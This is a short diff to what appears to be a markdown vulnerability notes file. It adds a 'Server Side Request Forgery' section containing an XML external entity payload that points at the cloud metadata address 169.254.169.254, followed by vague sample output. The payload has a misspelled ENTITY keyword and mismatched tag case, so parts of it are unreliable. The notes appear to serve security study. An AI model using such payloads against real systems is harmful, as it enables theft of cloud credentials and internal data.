@@ -97,9 +97,22 @@ Online MAP editors using KML
  
 This is Vulnerability
     
+## Server Side Request Forgery
 
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTTITY asif SYSTEM "https://169.254.169.254"> ]>
+    <userInfo>
+    <FirstName>Khan</firstName>
+    <lastName>&asif;</lastName>
+    </userInfo>
 
-
+ ## OUTPUT
+ 
+ Hello asif 1.0
+ 2007-01-09
+ 2007-03-01
+ .......
+ ''''''
 
 
 
